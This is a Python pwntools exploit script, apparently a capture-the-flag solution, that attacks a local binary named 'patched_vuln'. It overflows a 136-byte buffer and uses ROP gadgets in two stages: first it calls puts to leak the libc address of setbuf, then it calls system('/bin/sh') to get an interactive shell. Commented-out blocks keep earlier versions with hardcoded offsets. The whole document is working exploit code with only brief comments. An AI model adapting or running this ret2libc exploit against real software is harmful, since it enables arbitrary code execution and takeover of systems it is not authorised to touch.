#!/usr/bin/env python

from pwn import *

context.binary = binary = './patched_vuln'
vuln_elf = ELF(binary)
libc = ELF('./libc.so.6')
vuln_rop = ROP(vuln_elf)

p = process(binary)

junk = b"A"*136

# calling puts to leak the setbuf address in memory
''' puts_at_plt = 0x400540
pop_rdi = 0x400913
setbuf_at_got = 0x601028
return_to_main = 0x400771

payload = [junk,
           p64(pop_rdi),
           p64(setbuf_at_got),
           p64(puts_at_plt),
           p64(return_to_main),
          ]

payload = b''.join(payload)
'''
payload = junk
payload += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload += p64(vuln_elf.got.setbuf)
payload += p64(vuln_elf.plt.puts)
payload += p64(vuln_elf.symbols.main)

p.sendlineafter('VeR!', payload)
p.recvuntil(b'AAAd\n')

leak = u64(p.recvline().strip().ljust(8,b"\x00"))
log.info(f"{hex(leak)=}")

# Now that we have the setbuf memory address
# we can get the system address and /bin/sh address as it's present in the libc only
#setbuf_offset = 0x88540
#libc_address = leak - setbuf_offset
#log.info(f"{hex(libc_address)=}")

libc.address = leak - libc.symbols.setbuf
'''
system_offset = 0x4f4e0
system_address = libc_address + system_offset
bin_sh_offset = 0x1b40fa
bin_sh_address = libc_address + bin_sh_offset
# below is used to fix the  stack alignment issue
stack_offset = 0x40052e

payload2 = [junk,
            p64(pop_rdi),
            p64(bin_sh_address),
            p64(stack_offset),
            p64(system_address),
           ]
payload2 = b''.join(payload2)
'''

payload2 = junk
payload2 += p64(vuln_rop.find_gadget(['pop rdi', 'ret'])[0])
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(vuln_rop.find_gadget(['ret'])[0])
payload2 += p64(libc.symbols.system)

p.sendline(payload2)

p.interactive()
